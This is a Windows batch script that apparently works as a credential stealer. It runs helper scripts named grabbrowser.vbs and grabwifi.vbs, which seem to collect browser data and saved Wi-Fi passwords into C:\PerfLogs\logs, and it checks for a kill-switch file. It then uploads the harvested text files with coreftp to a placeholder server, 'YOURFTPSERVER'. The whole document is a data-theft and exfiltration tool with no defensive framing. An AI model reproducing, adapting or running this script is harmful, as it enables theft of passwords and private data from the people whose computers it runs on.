@ECHO OFF
mkdir C:\Perflogs\logs
del C:\Perflogs\logs\*.txt
wscript "%MYFILES%\grabbrowser.vbs"
wscript "%MYFILES%\grabwifi.vbs"
rem Wait 10000
if exist "C:\idontlikeyoufulkoly\dontupload.txt" exit
start coreftp.exe -s -O -site YOURFTPSERVER   -u C:\PerfLogs\logs\*.txt   -p /Upload/
EXIT